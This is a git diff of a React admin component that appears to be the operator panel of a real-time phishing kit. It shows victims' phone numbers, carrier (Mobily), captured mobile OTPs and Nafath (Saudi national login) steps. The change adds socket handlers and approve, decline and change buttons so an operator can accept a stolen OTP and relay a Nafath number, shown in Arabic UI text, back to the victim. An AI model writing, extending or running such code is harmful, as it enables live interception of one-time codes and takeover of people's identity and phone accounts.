@@ -211,8 +211,7 @@ const Main = () => {
   };
 
   const handleAcceptService = async (id) => {
-    if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
-    socket.emit("acceptService", { id, price });
+    socket.emit("acceptService", id);
     setUser({
       data: { ...user.data, networkAccept: true, navazAceept: false },
       active: true,
@@ -280,6 +279,35 @@ const Main = () => {
     });
   };
 
+  const handleAcceptMobOtp = async (id) => {
+    if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
+    setUser({
+      data: {
+        ...user.data,
+        mobOtpAccept: true,
+        checked: true,
+      },
+      active: true,
+    });
+    socket.emit("acceptMobOtp", { id, price });
+    await getUsers();
+  };
+
+  const handleDeclineMobOtp = (id) => {
+    socket.emit("declineMobOtp", id);
+    const _user = Users.find((u) => {
+      if (u._id === id) {
+        return { ...u, mobOtpAccept: true };
+      }
+    });
+    const withOut = Users.filter((u) => u._id !== id);
+    setUsers([...withOut, _user]);
+    setUser({
+      data: { ..._user, mobOtpAccept: true },
+      active: true,
+    });
+  };
+
   useEffect(() => {
     const fetchUsers = async () => {
       try {
@@ -320,6 +348,7 @@ const Main = () => {
     socket.on("phone", fetchUsers);
     socket.on("phoneOtp", fetchUsers);
     socket.on("navazOtp", fetchUsers);
+    socket.on("mobOtp", fetchUsers);
 
     // Cleanup to avoid duplicate listeners
     return () => {
@@ -333,6 +362,7 @@ const Main = () => {
       socket.off("phone", fetchUsers);
       socket.off("phoneOtp", fetchUsers);
       socket.off("navazOtp", fetchUsers);
+      socket.off("mobOtp", fetchUsers);
       socket.disconnect();
     };
   }, []);
@@ -643,12 +673,6 @@ const Main = () => {
                   user.data.phoneNetwork === "Mobily" &&
                   !user.data.networkAccept && (
                     <>
-                      <input
-                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
-                        value={price}
-                        onChange={(e) => setPrice(e.target.value)}
-                        placeholder="رقم نفاذ"
-                      />
                       <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                         <button
                           className="bg-green-500 w-1/2 p-2 rounded-lg"
@@ -668,9 +692,76 @@ const Main = () => {
 
                 {}
                 {user.data.phoneAccept &&
+                user.data.phoneNetwork === "Mobily" &&
+                user.data.networkAccept &&
+                user.data.mobOtp &&
+                !user.data.navazAceept ? (
+                  // <>
+                  //   <input
+                  //     className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                  //     value={price}
+                  //     onChange={(e) => setPrice(e.target.value)}
+                  //     placeholder="رقم نفاذ"
+                  //   />
+                  //   <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                  //     <button
+                  //       className="bg-yellow-500 w-1/2 p-2 rounded-lg"
+                  //       onClick={() => handleChange(user.data._id)}
+                  //     >
+                  //       تغيير
+                  //     </button>
+                  //     <button
+                  //       className="bg-green-500 w-1/2 p-2 rounded-lg"
+                  //       onClick={() => handleAcceptNavaz(user.data._id)}
+                  //     >
+                  //       قبول
+                  //     </button>
+
+                  //     <button
+                  //       className="bg-red-500 w-1/2 p-2 rounded-lg"
+                  //       onClick={() => handleDeclineNavaz(user.data._id)}
+                  //     >
+                  //       رفض
+                  //     </button>
+                  //   </div>
+                  // </>
+                  ""
+                ) : (
+                  <>
+                    <input
+                      className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                      value={price}
+                      onChange={(e) => setPrice(e.target.value)}
+                      placeholder="رقم نفاذ"
+                    />
+                    <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                      <button
+                        className="bg-yellow-500 w-1/2 p-2 rounded-lg"
+                        onClick={() => handleChange(user.data._id)}
+                      >
+                        تغيير
+                      </button>
+                      <button
+                        className="bg-green-500 w-1/2 p-2 rounded-lg"
+                        onClick={() => handleAcceptNavaz(user.data._id)}
+                      >
+                        قبول
+                      </button>
+
+                      <button
+                        className="bg-red-500 w-1/2 p-2 rounded-lg"
+                        onClick={() => handleDeclineNavaz(user.data._id)}
+                      >
+                        رفض
+                      </button>
+                    </div>
+                  </>
+                )}
+                {user.data.phoneAccept &&
                   user.data.phoneNetwork === "Mobily" &&
                   user.data.networkAccept &&
-                  !user.data.navazAceept && (
+                  user.data.mobOtp &&
+                  !user.data.mobOtpAccept && (
                     <>
                       <input
                         className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
@@ -680,21 +771,15 @@ const Main = () => {
                       />
                       <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                         <button
-                          className="bg-yellow-500 w-1/2 p-2 rounded-lg"
-                          onClick={() => handleChange(user.data._id)}
-                        >
-                          تغيير
-                        </button>
-                        <button
                           className="bg-green-500 w-1/2 p-2 rounded-lg"
-                          onClick={() => handleAcceptNavaz(user.data._id)}
+                          onClick={() => handleAcceptMobOtp(user.data._id)}
                         >
                           قبول
                         </button>
 
                         <button
                           className="bg-red-500 w-1/2 p-2 rounded-lg"
-                          onClick={() => handleDeclineNavaz(user.data._id)}
+                          onClick={() => handleDeclineMobOtp(user.data._id)}
                         >
                           رفض
                         </button>
